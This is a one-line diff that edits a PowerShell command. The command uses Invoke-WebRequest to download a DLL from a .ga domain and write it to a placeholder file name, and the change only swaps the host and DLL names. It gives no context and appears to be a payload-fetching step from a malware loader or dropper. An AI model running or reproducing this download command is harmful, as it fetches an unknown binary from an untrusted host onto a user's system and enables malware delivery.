@@ -1,1 +1,1 @@
-powershell -c Invoke-WebRequest -Uri 'https://Lunar.ga/lunars.dll' -OutFile 'FileName.Extension'
+powershell -c Invoke-WebRequest -Uri 'https://Lunars.ga/lunar.dll' -OutFile 'FileName.Extension'
